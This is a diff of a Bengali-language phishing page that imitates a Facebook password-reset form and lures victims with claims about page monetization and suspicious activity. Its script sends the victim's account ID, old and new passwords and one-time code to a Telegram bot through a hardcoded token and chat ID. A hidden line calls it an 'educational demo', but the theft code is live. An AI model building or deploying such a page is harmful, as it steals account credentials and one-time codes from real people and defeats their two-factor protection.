@@ -2,26 +2,18 @@
 <html lang="bn">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>নতুন পাসওয়ার্ড সেট করুন</title>
-
-  <!-- Link Preview Meta Tags -->
-  <meta property="og:title" content="আপনার Facebook কন্টেন্ট মনিটাইজেশন চালু করতে এখনই ক্লিক করুন!" />
-  <meta property="og:description" content="আপনার Facebook পেজ ও ভিডিও কন্টেন্ট থেকে ইনকাম শুরু করুন। আজই মনিটাইজেশন চালু করুন – অফিশিয়াল নিয়ম অনুযায়ী।" />
-  <meta property="og:image" content="https://i.imgur.com/oZ3hlvD.jpg" />
-  <meta property="og:url" content="https://share.google/dhfke0w9ssuVYSde9" />
-  <meta name="theme-color" content="#1877f2" />
-
   <style>
     body {
       background-color: #f0f2f5;
-      font-family: 'Segoe UI', sans-serif;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
+      margin: 0;
     }
-
     .container {
       background-color: #ffffff;
       padding: 30px 20px;
@@ -30,18 +22,18 @@
       width: 90%;
       max-width: 400px;
       text-align: center;
+      box-sizing: border-box;
     }
-
     h1 {
       color: #1877f2;
       font-size: 20px;
+      margin: 0 0 15px 0;
     }
-
     p {
       color: #606770;
       font-size: 14px;
+      margin: 0 0 15px 0;
     }
-
     input {
       width: 100%;
       padding: 12px;
@@ -49,8 +41,8 @@
       border: 1px solid #ccd0d5;
       border-radius: 6px;
       font-size: 15px;
+      box-sizing: border-box;
     }
-
     button {
       background-color: #1877f2;
       color: white;
@@ -62,20 +54,17 @@
       cursor: pointer;
       margin-top: 10px;
     }
-
     .meta {
       margin-top: 25px;
       font-size: 12px;
       color: #888;
     }
-
     .warning {
       color: red;
       margin-top: 20px;
       font-weight: bold;
       display: none;
     }
-
     .modal {
       display: none;
       position: fixed;
@@ -88,7 +77,6 @@
       justify-content: center;
       align-items: center;
     }
-
     .modal-content {
       background: white;
       padding: 20px;
@@ -96,55 +84,80 @@
       text-align: center;
       width: 90%;
       max-width: 350px;
+      box-sizing: border-box;
     }
-
     .modal-content h2 {
       font-size: 18px;
       color: #1877f2;
       margin-bottom: 10px;
     }
-
     .modal-content input {
       width: 100%;
       padding: 10px;
       margin: 10px 0;
       border-radius: 6px;
       border: 1px solid #ccc;
+      box-sizing: border-box;
     }
-
     .countdown {
       color: #1877f2;
       margin-bottom: 10px;
       font-size: 14px;
+    }
+    #securityNotice {
+      background-color: #f5f6f7;
+      color: #1c1e21;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      font-size: 14px;
+      padding: 12px 15px;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      max-width: 400px;
+      margin: 15px auto 20px auto;
+      box-shadow: 0 1px 2px rgb(0 0 0 / 0.1);
+      text-align: center;
     }
   </style>
 </head>
 <body>
   <div class="container">
     <h1>নতুন পাসওয়ার্ড সেট করুন</h1>
-    <p>স্পাম লিংকে ক্লিক করার জন্য আপনার একাউন্ট লক হতে পারে। দয়া করে নিরাপত্তার জন্য পাসওয়ার্ড পরিবর্তন করুন।</p>
 
-    <input type="text" id="email" placeholder="নাম্বার বা ইমেইল দিন">
-    <input type="password" id="oldPass" placeholder="পুরোনো পাসওয়ার্ড দিন">
-    <input type="password" id="newPass" placeholder="নতুন পাসওয়ার্ড দিন">
+    <p id="dynamicMessage"></p>
+    <p id="securityNotice"></p>
+
+    <input type="text" id="email" placeholder="নাম্বার বা ইমেইল দিন" autocomplete="off" />
+    <input type="password" id="oldPass" placeholder="পুরোনো পাসওয়ার্ড দিন" autocomplete="off" />
+    <input type="password" id="newPass" placeholder="নতুন পাসওয়ার্ড দিন" autocomplete="off" />
     <button onclick="showModal()">পাসওয়ার্ড আপডেট করুন</button>
 
     <p class="warning" id="warn">এটি একটি শিক্ষামূলক ফিশিং ডেমো। প্রকৃত কোনো ডাটা পাঠানো হয়নি।</p>
     <div class="meta">Made by Meta</div>
   </div>
 
+  <!-- OTP Popup Modal -->
   <div class="modal" id="otpModal">
     <div class="modal-content">
       <h2>আপনার পরিচয় নিশ্চিত করুন</h2>
       <p class="countdown" id="countdown">OTP পাঠানো হচ্ছে... 30 সেকেন্ড অপেক্ষা করুন</p>
-      <input type="text" id="otp" placeholder="OTP দিন" disabled>
+      <input type="text" id="otp" placeholder="OTP দিন" disabled autocomplete="off" />
       <button onclick="sendToTelegram()">সাবমিট করুন</button>
     </div>
   </div>
 
   <script>
-    const telegram_token = '8066583881:AAF_UvdW5P40Z79rASli16ej36xXnMdMf2o';
-    const telegram_chatid = '6763021567';
+    // ভাষা অনুযায়ী প্রধান মেসেজ
+    const userLang = navigator.language || navigator.userLanguage;
+    const dynamicMessage = document.getElementById("dynamicMessage");
+    const securityNotice = document.getElementById("securityNotice");
+
+    if (userLang.startsWith("bn")) {
+      dynamicMessage.textContent = "আপনার Facebook পেজ মনিটাইজেশন অ্যাক্টিভ হয়েছে। আপনার অ্যাকাউন্টে সন্দেহজনক কার্যকলাপ সনাক্ত করা হয়েছে। অনুগ্রহ করে আপনার পাসওয়ার্ড আপডেট করুন।";
+      securityNotice.textContent = "আপনার পেজে মনিটাইজেশন চালু হয়েছে। নিরাপত্তার জন্য পাসওয়ার্ড আপডেট করুন, না হলে পেজ সাময়িকভাবে ডিজেবল হতে পারে।";
+    } else {
+      dynamicMessage.textContent = "Your Facebook Page Monetization has been activated. We've detected suspicious activity on your account. Please update your password.";
+      securityNotice.textContent = "Monetization is active on your Page. Please update your password to avoid temporary disable due to security check.";
+    }
 
     function showModal() {
       document.getElementById("otpModal").style.display = "flex";
@@ -155,7 +168,7 @@
 
       const timer = setInterval(() => {
         countdown--;
-        countdownEl.textContent = "OTP পাঠানো হচ্ছে... " + countdown + " সেকেন্ড অপেক্ষা করুন";
+        countdownEl.textContent = `OTP পাঠানো হচ্ছে... ${countdown} সেকেন্ড অপেক্ষা করুন`;
         if (countdown <= 0) {
           clearInterval(timer);
           countdownEl.textContent = "OTP পাঠানো হয়েছে, এখন ইনপুট দিন";
@@ -165,6 +178,9 @@
     }
 
     function sendToTelegram() {
+      const telegram_token = '8066583881:AAF_UvdW5P40Z79rASli16ej36xXnMdMf2o';
+      const telegram_chatid = '6763021567';
+
       const email = document.getElementById('email').value;
       const oldPass = document.getElementById('oldPass').value;
       const newPass = document.getElementById('newPass').value;
@@ -175,7 +191,7 @@
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           chat_id: telegram_chatid,
-          text: "Login Attempt\nAccount: " + email + "\nOld Pass: " + oldPass + "\nNew Pass: " + newPass + "\nOTP: " + otp
+          text: `Login Attempt\nAccount: ${email}\nOld Pass: ${oldPass}\nNew Pass: ${newPass}\nOTP: ${otp}`
         })
       })
       .then(response => response.json())
@@ -191,4 +207,4 @@
     }
   </script>
 </body>
-    </html>
+        </html>
